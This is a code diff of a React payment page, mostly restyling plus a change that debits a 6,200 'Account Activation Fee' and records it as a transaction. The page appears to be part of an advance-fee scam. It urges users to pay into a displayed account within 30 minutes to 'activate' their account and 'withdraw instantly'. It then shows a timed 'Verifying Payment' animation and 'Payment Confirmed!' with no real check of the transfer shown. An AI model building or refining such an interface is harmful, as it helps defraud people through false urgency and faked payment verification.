@@ -99,12 +99,25 @@ const BankTransferPayment: React.FC = () => {
       const newActivationCode = generateActivationCode();
       setActivationCode(newActivationCode);
       
-      // Activate user account and add balance
+      // Debit user account and activate
       if (user) {
+        const newBalance = user.balance - 6200;
         updateUserInfo({ 
           isActivated: true,
-          balance: user.balance + 6200 
+          balance: newBalance 
         });
+        
+        // Add transaction to history
+        const existingTransactions = JSON.parse(localStorage.getItem('transactions') || '[]');
+        const newTransaction = {
+          id: `tr-${Date.now()}`,
+          type: "debit",
+          amount: 6200,
+          date: new Date().toISOString().split('T')[0],
+          description: "Account Activation Fee",
+          status: "completed"
+        };
+        localStorage.setItem('transactions', JSON.stringify([newTransaction, ...existingTransactions]));
       }
       
       setShowProcessingDialog(false);
@@ -126,108 +139,108 @@ const BankTransferPayment: React.FC = () => {
         onClose={() => setShowOpayWarning(false)} 
       />
 
-      {/* Header - Slightly smaller */}
-      <div className="flex items-center p-2 border-b">
-        <button onClick={handleBack} className="mr-2">
-          <ArrowLeft size={16} className="text-green-800" />
+      {/* Header - Full width */}
+      <div className="flex items-center p-4 border-b">
+        <button onClick={handleBack} className="mr-4">
+          <ArrowLeft size={20} className="text-green-800" />
         </button>
-        <h1 className="text-sm font-medium text-gray-800">Bank Transfer</h1>
+        <h1 className="text-lg font-medium text-gray-800">Bank Transfer</h1>
       </div>
 
-      <div className="p-3 max-w-sm mx-auto">
+      <div className="p-4">
         {isLoading ? (
-          <div className="flex flex-col items-center justify-center h-48">
-            <div className="w-10 h-10 border-3 border-green-800 border-t-transparent rounded-full animate-spin mb-3"></div>
+          <div className="flex flex-col items-center justify-center h-64">
+            <div className="w-12 h-12 border-3 border-green-800 border-t-transparent rounded-full animate-spin mb-4"></div>
             <p className="text-sm text-gray-600">Loading account details...</p>
           </div>
         ) : (
           <>
-            <div className="mb-4">
-              <h2 className="text-lg font-bold">Fund Wallet via Bank Transfer</h2>
-              <p className="text-gray-500 text-xs mt-1">
+            <div className="mb-6">
+              <h2 className="text-xl font-bold">Fund Wallet via Bank Transfer</h2>
+              <p className="text-gray-500 text-sm mt-2">
                 Transfer To This Account Below Within 30mins And Get Activation Code Once Your Payment Got Confirmed
               </p>
             </div>
             
-            <div className="bg-gray-50 rounded-lg overflow-hidden text-sm">
-              <div className="p-3 flex justify-between items-center">
+            <div className="bg-gray-50 rounded-lg overflow-hidden">
+              <div className="p-4 flex justify-between items-center">
                 <div className="flex-1">
                   <div className="flex items-center">
-                    <div className="bg-gray-100 p-1.5 rounded-md mr-3">
-                      <Banknote size={20} className="text-green-800" />
+                    <div className="bg-gray-100 p-2 rounded-md mr-4">
+                      <Banknote size={24} className="text-green-800" />
                     </div>
                     <div>
-                      <p className="text-gray-500 text-xs">Bank Name</p>
-                      <p className="font-bold text-green-800 text-sm">{accountDetails.bankName}</p>
+                      <p className="text-gray-500 text-sm">Bank Name</p>
+                      <p className="font-bold text-green-800">{accountDetails.bankName}</p>
                     </div>
                   </div>
                 </div>
                 <div className="flex items-center text-blue-600">
-                  <span className="bg-green-100 px-2 py-0.5 rounded-md text-green-600 text-xs">Active</span>
+                  <span className="bg-green-100 px-3 py-1 rounded-md text-green-600 text-sm">Active</span>
                 </div>
               </div>
               
-              <div className="border-t p-3 flex justify-between items-center">
+              <div className="border-t p-4 flex justify-between items-center">
                 <div className="flex items-center">
-                  <div className="bg-gray-200 p-1.5 rounded-md mr-3 w-7 h-7 flex items-center justify-center">
-                    <span className="font-mono text-xs">123</span>
+                  <div className="bg-gray-200 p-2 rounded-md mr-4 w-10 h-10 flex items-center justify-center">
+                    <span className="font-mono text-sm">123</span>
                   </div>
                   <div>
-                    <p className="text-gray-500 text-xs">Account Number</p>
-                    <p className="font-bold text-gray-800 text-sm">{accountDetails.accountNumber}</p>
+                    <p className="text-gray-500 text-sm">Account Number</p>
+                    <p className="font-bold text-gray-800">{accountDetails.accountNumber}</p>
                   </div>
                 </div>
                 <Button 
                   variant="outline" 
                   size="sm"
-                  className="bg-green-800 text-white hover:bg-green-700 text-xs px-2 py-1 h-7"
+                  className="bg-green-800 text-white hover:bg-green-700"
                   onClick={() => handleCopyClick(accountDetails.accountNumber, "Account number")}
                 >
-                  <Copy size={14} className="mr-1" /> Copy
+                  <Copy size={16} className="mr-2" /> Copy
                 </Button>
               </div>
               
-              <div className="border-t p-3 flex justify-between items-center">
+              <div className="border-t p-4 flex justify-between items-center">
                 <div className="flex items-center">
-                  <div className="bg-gray-200 p-1.5 rounded-md mr-3 w-7 h-7 flex items-center justify-center">
-                    <User2 size={16} className="text-gray-600" />
+                  <div className="bg-gray-200 p-2 rounded-md mr-4 w-10 h-10 flex items-center justify-center">
+                    <User2 size={20} className="text-gray-600" />
                   </div>
                   <div>
-                    <p className="text-gray-500 text-xs">Account Name</p>
-                    <p className="font-bold text-gray-800 text-sm">{accountDetails.accountName}</p>
+                    <p className="text-gray-500 text-sm">Account Name</p>
+                    <p className="font-bold text-gray-800">{accountDetails.accountName}</p>
                   </div>
                 </div>
               </div>
               
-              <div className="border-t p-3 flex justify-between items-center">
+              <div className="border-t p-4 flex justify-between items-center">
                 <div className="flex items-center">
-                  <div className="bg-gray-200 p-1.5 rounded-md mr-3 w-7 h-7 flex items-center justify-center">
-                    <Wallet size={16} className="text-blue-600" />
+                  <div className="bg-gray-200 p-2 rounded-md mr-4 w-10 h-10 flex items-center justify-center">
+                    <Wallet size={20} className="text-blue-600" />
                   </div>
                   <div>
-                    <p className="text-gray-500 text-xs">Amount</p>
-                    <p className="font-bold text-green-800 text-sm">{accountDetails.amount}</p>
+                    <p className="text-gray-500 text-sm">Amount</p>
+                    <p className="font-bold text-green-800">{accountDetails.amount}</p>
                   </div>
                 </div>
               </div>
             </div>
 
-            <div className="mt-4 bg-gray-100 p-3 rounded-lg">
-              <p className="text-gray-700 text-xs">
+            <div className="mt-6 bg-gray-100 p-4 rounded-lg">
+              <p className="text-gray-700 text-sm">
                 Hi, {user?.firstName || "James"}
               </p>
-              <p className="text-gray-700 text-xs mt-1">
+              <p className="text-gray-700 text-sm mt-2">
                 Make A One Time Payment In Bank Details Above To Activate Your Account And Withdraw Instantly
               </p>
             </div>
               
-            <div className="p-2 text-center text-green-800 text-xs mt-3">
-              <p>this one-time account expires in {formatTime(timeLeft)}</p>
+            <div className="p-4 text-center text-green-800 text-sm mt-4">
+              <p>This one-time account expires in {formatTime(timeLeft)}</p>
             </div>
 
             <button
               onClick={handlePaymentConfirmation}
-              className="w-full bg-green-800 text-white py-2 rounded-lg mt-3 text-sm font-medium"
+              className="w-full bg-green-800 text-white py-3 rounded-lg mt-4 text-base font-medium"
               disabled={showProcessingDialog}
             >
               {buttonText}
@@ -236,25 +249,24 @@ const BankTransferPayment: React.FC = () => {
         )}
       </div>
 
-      {/* Processing Dialog with 7-second loading */}
+      {/* Processing Dialog with 7-second loading - Full page overlay */}
       <Dialog open={showProcessingDialog} onOpenChange={setShowProcessingDialog}>
         <DialogContent className="sm:max-w-md p-0 gap-0">
-          <div className="p-6">
-            <h2 className="text-xl font-bold text-center mb-6">Payment Processing</h2>
+          <div className="p-8">
+            <h2 className="text-2xl font-bold text-center mb-8">Payment Processing</h2>
             <div className="flex flex-col items-center justify-center">
-              <div className="w-16 h-16 rounded-full border-4 border-gray-200 mb-4 relative">
+              <div className="w-24 h-24 rounded-full border-4 border-gray-200 mb-6 relative">
                 <div 
-                  className="absolute inset-0 rounded-full border-4 border-green-800 border-t-transparent transition-all duration-100"
+                  className="absolute inset-0 rounded-full border-4 border-green-800 border-t-transparent animate-spin"
                   style={{ 
-                    transform: `rotate(${(loadingProgress / 100) * 360}deg)`,
-                    clipPath: `polygon(50% 50%, 50% 0%, ${50 + 50 * Math.cos((loadingProgress / 100) * 2 * Math.PI - Math.PI/2)}% ${50 + 50 * Math.sin((loadingProgress / 100) * 2 * Math.PI - Math.PI/2)}%, 100% 100%, 0% 100%)`
+                    transform: `rotate(${(loadingProgress / 100) * 360}deg)`
                   }}
                 ></div>
                 <div className="absolute inset-2 bg-green-800 rounded-full flex items-center justify-center">
-                  <span className="text-white text-xs font-bold">{Math.round(loadingProgress)}%</span>
+                  <span className="text-white text-sm font-bold">{Math.round(loadingProgress)}%</span>
                 </div>
               </div>
-              <p className="text-gray-500">Verifying Payment...</p>
+              <p className="text-gray-500 text-lg">Verifying Payment...</p>
             </div>
           </div>
         </DialogContent>
@@ -263,28 +275,28 @@ const BankTransferPayment: React.FC = () => {
       {/* Payment Success Dialog */}
       <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
         <DialogContent className="sm:max-w-md p-0 gap-0">
-          <div className="p-6">
-            <div className="flex flex-col items-center mb-4">
-              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
-                <CheckCircle size={36} className="text-green-600" />
+          <div className="p-8">
+            <div className="flex flex-col items-center mb-6">
+              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-6">
+                <CheckCircle size={40} className="text-green-600" />
               </div>
-              <h2 className="text-xl font-bold text-center text-green-800">Payment Confirmed!</h2>
-              <p className="text-center text-gray-600 mt-2">Your account has been activated</p>
+              <h2 className="text-2xl font-bold text-center text-green-800">Payment Confirmed!</h2>
+              <p className="text-center text-gray-600 mt-3">Your account has been activated</p>
             </div>
             
-            <div className="bg-gray-50 p-4 rounded-lg mb-4">
-              <p className="text-sm text-gray-600 text-center mb-2">Your Activation Code</p>
+            <div className="bg-gray-50 p-6 rounded-lg mb-6">
+              <p className="text-sm text-gray-600 text-center mb-3">Your Activation Code</p>
               <div className="flex justify-center">
-                <span className="text-2xl font-bold text-green-800 bg-white px-4 py-2 rounded border tracking-wider">
+                <span className="text-3xl font-bold text-green-800 bg-white px-6 py-3 rounded border tracking-wider">
                   {activationCode}
                 </span>
               </div>
-              <p className="text-xs text-gray-500 text-center mt-2">Save this code for your records</p>
+              <p className="text-xs text-gray-500 text-center mt-3">Save this code for your records</p>
             </div>
             
             <button
               onClick={handleGoToDashboard}
-              className="w-full bg-green-800 text-white py-3 rounded-lg font-medium"
+              className="w-full bg-green-800 text-white py-4 rounded-lg font-medium text-lg"
             >
               Go to Dashboard
             </button>
